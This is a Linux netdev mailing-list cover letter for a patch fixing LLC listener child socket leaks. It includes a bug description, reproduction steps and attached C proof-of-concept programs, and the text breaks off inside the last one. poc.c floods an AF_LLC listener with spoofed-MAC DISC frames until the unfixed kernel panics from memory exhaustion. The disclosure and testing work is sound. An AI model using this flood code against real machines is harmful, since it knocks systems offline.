Received: from mail-pz2-f40.google.com (mail-pz2-f40.google.com [74.125.228.40])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F2DB9327204
	for <netdev@vger.kernel.org>; Wed, 30 Sep 2026 13:29:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.40
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790775005; cv=none; b=cFW9WTq5u6H2FSOHqA6usrLdu54j346mh3R9wvnSb0MVxrRYdB7GcDvdYiIKVELkvKwrenMkrY7rNQYNutZ6v+9zmy+jNWq7kNj1HIgFZAScdDqK3rSHb+fD146NKmxLJ93riuKL7KsG7GpoBIH2oqmALe0dgHZJ6TD1UxLGTPU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790775005; c=relaxed/simple;
	bh=ijlEPjqLS1wLxlH9xocrbwK22drB7QPuVKgmLb3+NuE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=jitOw94i5pRhy8P7EEucUFKdL9Moo/+8NtwPiIss5Y2vGg31mmxyzgrgFeeDlpS0IKZAx+HsAg9nZc21BBDATB9E/XubE8uRm5a/H0B/aUk+tb2VsEPk2u3E2qDryUPUNnKgLWrLl2E7VDJj5Iu/XMs7vzft2YXvSh3XVFyABHg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=M2deX5xU; arc=none smtp.client-ip=74.125.228.40
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="M2deX5xU"
Received: by mail-pz2-f40.google.com with SMTP id 41be03b00d2f7-cc78d45f78fso3323780a12.3
        for <netdev@vger.kernel.org>; Wed, 30 Sep 2026 06:29:55 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790774993; x=1791379793; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=F/IvoHGkkT5d8lYDnIbSNFso2j3s5q/CjqMFoY1oqLM=;
        b=M2deX5xUX51FxAOnRMgkQUbfi46Cqj+bAUkGDOwj7YdBCvFzTAeWsMhkI7glSF3R+L
         o2ktBO6lPk9h58yCMumnZn4eHLDq+Ry3fRinsMuPsy1eL9IvguF7ASJdhFnV8W8sIZYT
         /116NSUuYAEXHlVbbjMOOZRws1rSvyhjDKa045mjbTeMTvkkvzOzlhpcj6jq/x9wqnUt
         KoAue1m9ZSGHK3zqXqvft+acH757XnlC/xKrxcAgptCAGqUMgs/KpP6zJ7IcQGdCA0Mb
         NFS6ttaedwCZZipLlUYzziSrGjZVtQpgxedc6kuAt0Ol9bdnSSqGJeCmBPZHV8KoyXjm
         s98g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790774993; x=1791379793;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=F/IvoHGkkT5d8lYDnIbSNFso2j3s5q/CjqMFoY1oqLM=;
        b=gtjB9eg7Hmuh80H/oQYhl41GtDGwg8kioONDPofAFI4vbhVlr+0j9bO0BXEPH3cHRm
         7K0dmYly/A/ft3Z0kY37daXbipeHvME527hYot+EKco88ppecoS3VloXcNe8PNs9Eprf
         5LNhsTtwq3uCyFFgaE8RpsN7gktfhzA92AKh5IqQkzTcadtijsdDypvjPNBQDynNkrT4
         emVwLyWdD18h9fDCUFW9oE01qUrMwpel8PgoXPQLrS48wOzps+oQPGbRglMg4seebcjY
         IzHDstLHjlCG0G5wTAXuj44Dz3gTTYkF8TIJlm95CtRUSNC71U1gAISpRfG/nkcDSK/y
         PMUg==
X-Forwarded-Encrypted: i=1; AKwUvBzc9XqNQ/rBi4JrXgQUh8/L+kp26Uzq3zdAhhBhIdpMXdSq+wO99pxCzoPTBImRlC2j08EQhMQ=@vger.kernel.org
X-Gm-Message-State: AFq9FYJ0BrZglPTFy0fr/YHUyZmQDmMgPZ2JpXzKUhb+aLNyWLID8hzW
	NhZ+ggHTNCJZjtLGtzLixEf2zR5WkabXnOXj+bCaQcorFwLnWR6vbJiAoPP7/rZGYeSH
X-Gm-Gg: AYBFou1yDz49goUYUH9abLl0Cw6cijawcOjAX1aD8Cxm0pLGEMX6VPiBWBuekCTwmJp
	geT6fOjdTX/UTDbaFdER4ECai3TMFij/oYfMD/tV9cLiTE6JBg7veabh/HVMjY9Q0EJwdVsxnU/
	T4OZTHUazctM4MilHids2MOKmkSJMgPEuWKP0tpeGafY8uZY7Dcro/g4guFpzVkjyao/SOJ1aib
	6J6YIfLYXFCLCSvMV386V7DsVpqp1Tfe1XX42FjUdXl3MHhwkxr+gI71l6mdxhHoKgEffE+5NMh
	5Mh0nrJywxZWdGHy+nnD4oMkSoJC1P87XaTLSjU4r7lUPWgxGR7MjjPy6CLy/PvoOK0bHY8oXpI
	x74WjcAQNsVE83RVFSDpwcdjK2H07vvnYIqfsfZu91JqueREA1kBEqLZgzV7P5I7IGGEZWnTjEe
	UQSB+LnRKehUTEepcx64JQsjmQtYWq0BrTAmWbnNeBKchLrtE86MmhGM7gvL7F/mFXdeSFMwFx8
	4Q1Ev20jss7Lvnt1sCO35BTEx5hELnnNhBXe+Hb
X-Received: by 2002:a17:90b:2241:b0:3a4:ee2b:31a4 with SMTP id 98e67ed59e1d1-3a4ee2b32c3mr2877a91.56.1790774993008;
        Wed, 30 Sep 2026 06:29:53 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc7d9f1574esm913931a12.2.2026.09.30.06.29.47
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 30 Sep 2026 06:29:52 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com
Cc: zihanx@nebusec.ai,
	horms@kernel.org,
	kees@kernel.org,
	ernestas.k@iconn-networks.com,
	leitao@debian.org,
	tim.bird@sony.com,
	shuangpeng.kernel@gmail.com,
	luoxuanqiang@kylinos.cn,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH net v13 0/2] llc: fix listener child socket leaks
Date: Wed, 30 Sep 2026 13:29:40 +0000
Message-ID: <cover.1790688018.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/llc/llc_conn.c and net/llc/af_llc.c.
A DISC command addressed to a matching AF_LLC listener in init_net can
trigger the leak. The attached poc.c opens its AF_LLC listener and
AF_PACKET sender in init_net; the shown commands create both veth
endpoints there. AF_LLC sockets are restricted to init_net. This is a
privileged test: veth setup needs CAP_NET_ADMIN, both sockets need
CAP_NET_RAW, and setting panic_on_oom needs privilege.

After creating a user/network namespace (e.g., with `unshare -Urn`), a
veth-based local sender requires an existing init_net listener and a
host-configured pair. The host keeps the listener-side endpoint in init_net
and moves the peer into the sender namespace (e.g., `ip link set dev <peer>
netns <pid>`). The sender needs CAP_NET_RAW in the user namespace that owns
its network namespace, but no CAP_NET_ADMIN to transmit on a preconfigured
interface. The attached PoC cannot exercise this split: it opens AF_LLC and
AF_PACKET in the same namespace. This split path was not tested
and is not claimed as a validated reproduction.

The series targets LLC listener passive-open and unaccepted-child lifecycle
handling. The normal established-connection data path is unchanged.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The listener receive path used to allocate and publish a child socket
before checking whether the frame was a passive-open request. Frames that
cannot establish a connection, such as DISC, could therefore leave a child
hashed in the SAP without an accept indication. Repeating those frames with
different source tuples accumulated child sockets and their references.

This series limits listener child creation to SABME, keeps the child and
its resources alive until accept or teardown, and releases the queued
indication when an unaccepted child leaves a data-accepting state. Deferred
listener SABMEs keep their receive device alive until backlog processing.
Stale out-of-service lookup results are rejected before LLC state-machine
dispatch.
The normal established-connection data path is unchanged. Duplicate SABMEs
are still delivered to the matching child.

The resource-leak behavior is present in the unfixed Linux v6.12.74
baseline. The crash log below is from that baseline with panic_on_oom=2; it
records the resulting OOM panic, not a crash from this patch. The
patched v13 kernel was built and all attached checks were run; it reported
no BUG, KASAN, Oops, kernel panic, or OOM.

Reproducer:

    gcc -O2 -static -o poc poc.c
    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up

For an unfixed Linux v6.12.74 guest:

    echo 2 > /proc/sys/vm/panic_on_oom
    ./poc llc_rx0 llc_tx0 110000

For patched v13, after the same veth setup, build and run:

    gcc -O2 -static -o poc-sabme poc-sabme.c
    gcc -O2 -static -o poc-backlog poc-backlog.c
    gcc -O2 -static -o poc-queued-disc poc-queued-disc.c
    ./poc-sabme accept llc_rx0 llc_tx0 1
    echo "SABME_ACCEPT_RC=$?"
    ./poc-sabme close llc_rx0 llc_tx0 16
    echo "SABME_CLOSE_RC=$?"
    ./poc-backlog llc_rx0 llc_tx0 1 10
    echo "BACKLOG_RC=$?"
    ./poc-queued-disc llc_rx0 llc_tx0
    echo "QUEUED_DISC_RC=$?"
    ./poc llc_rx0 llc_tx0 110000
    echo "DISC_FLOOD_RC=$?"

The baseline flood is run in a fresh, unfixed Linux v6.12.74 guest. The
patched-kernel run reported:

    SABME_ACCEPT_RC=0
    sabme_close_before=0 sabme_close_open=17 sabme_close_after=0
    SABME_CLOSE_RC=0
    listen_backlog=1 sabme_sent=10 llc_sockets_open=3 expected_max=3
    llc_sockets_after_close=0
    BACKLOG_RC=0
    queued_disc_open=2 accept_errno=0 queued_disc_after_close=0
    QUEUED_DISC_RC=0
    DISC_FLOOD_RC=0

Packetdrill was not used for frame injection. Its built-in packet-event
syntax models TCP, UDP, and ICMP packets over IP; it has no event form for
arbitrary 802.3/802.2 LLC frames. This PoC sets the Ethernet length field,
source/destination MACs and LLC DSAP, SSAP, and control bytes.
It then sends the frame through AF_PACKET. Packetdrill may use AF_PACKET
internally for Linux packet plumbing, but its scripting syntax has no LLC
frame form.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment running Ubuntu
24.04.4 LTS.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

------BEGIN poc-sabme.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int llc_socket_count(void)
{
	FILE *fp = fopen("/proc/net/llc/socket", "r");
	char line[256];
	int count = 0;

	if (!fp)
		return -1;
	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}
	while (fgets(line, sizeof(line), fp))
		count++;
	fclose(fp);
	return count;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd = socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one = 1;
	int ifindex = get_ifindex(ifname);
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
		       const unsigned char src[ETH_ALEN])
{
	static unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = SABME_CMD;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
}

int main(int argc, char **argv)
{
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	const char *mode;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 1;
	uint64_t i;
	int listener_fd;
	int packet_fd;
	int ifindex;
	int baseline_count;
	int before_close;
	int after_close;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	mode = argv[1];
	if (argc > 2)
		rx_if = argv[2];
	if (argc > 3)
		tx_if = argv[3];
	if (argc > 4) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[4], &end, 0);
		if (errno || !end || *end != '\0' || !count) {
			fprintf(stderr, "invalid count: %s\n", argv[4]);
			return EXIT_FAILURE;
		}
	}

	baseline_count = llc_socket_count();
	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);
	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
		mode, rx_if, tx_if, (unsigned long long)count);

	if (!strcmp(mode, "accept")) {
		int child;
		struct sockaddr_llc addr;
		socklen_t addrlen = sizeof(addr);
		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };

		fill_src_mac(src_mac, 1);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
		if (child < 0)
			die_errno("accept(AF_LLC)");
		printf("SABME passive open accepted\naccept_rc=0\n");
		close(child);
		close(packet_fd);
		close(listener_fd);
		return 0;
	}

	if (!strcmp(mode, "close")) {
		for (i = 1; i <= count; i++) {
			fill_src_mac(src_mac, i);
			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
				src_mac[ETH_ALEN - 1] ^= 1;
			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		}
		before_close = llc_socket_count();
		close(packet_fd);
		close(listener_fd);
		usleep(200000);
		after_close = llc_socket_count();
		printf("SABME sent without accept and listener closed\n"
		       "sabme_close_before=%d sabme_close_open=%d "
		       "sabme_close_after=%d\n",
		       baseline_count, before_close, after_close);
		if (baseline_count < 0 || after_close != baseline_count) {
			fprintf(stderr, "FAIL: leftover sockets after close: %d\n",
				after_close);
			return EXIT_FAILURE;
		}
		printf("SABME_CLOSE_RC=0\n");
		return 0;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc-sabme.c--------

------BEGIN poc-backlog.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int llc_socket_count(void)
{
	FILE *fp = fopen("/proc/net/llc/socket", "r");
	char line[256];
	int count = 0;

	if (!fp)
		return -1;
	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}
	while (fgets(line, sizeof(line), fp))
		count++;
	fclose(fp);
	return count;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	const char *rx_if = argc > 1 ? argv[1] : "llc_rx0";
	const char *tx_if = argc > 2 ? argv[2] : "llc_tx0";
	int backlog = argc > 3 ? atoi(argv[3]) : 1;
	int nframes = argc > 4 ? atoi(argv[4]) : 10;
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_llc addr;
	struct sockaddr_ll sll;
	static unsigned char frame[ETH_ZLEN];
	int listener_fd, packet_fd, ifindex, one = 1, i, after_send, after_close;
	int expected_max;

	listener_fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (listener_fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(rx_if, dst_mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = DEFAULT_SAP;
	memcpy(addr.sllc_mac, dst_mac, ETH_ALEN);
	if (bind(listener_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(listener_fd, backlog) < 0)
		die_errno("listen(AF_LLC)");

	ifindex = get_ifindex(tx_if);
	packet_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (packet_fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(packet_fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;
	if (bind(packet_fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	for (i = 1; i <= nframes; i++) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memset(frame, 0, sizeof(frame));
		memcpy(frame, dst_mac, ETH_ALEN);
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
		((struct ethhdr *)frame)->h_proto = htons(3);
		frame[ETH_HLEN + 0] = DEFAULT_SAP;
		frame[ETH_HLEN + 1] = 0x04;
		frame[ETH_HLEN + 2] = SABME_CMD;
		memset(&sll, 0, sizeof(sll));
		sll.sll_family = AF_PACKET;
		sll.sll_ifindex = ifindex;
		sll.sll_halen = ETH_ALEN;
		memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
		if (sendto(packet_fd, frame, sizeof(frame), 0,
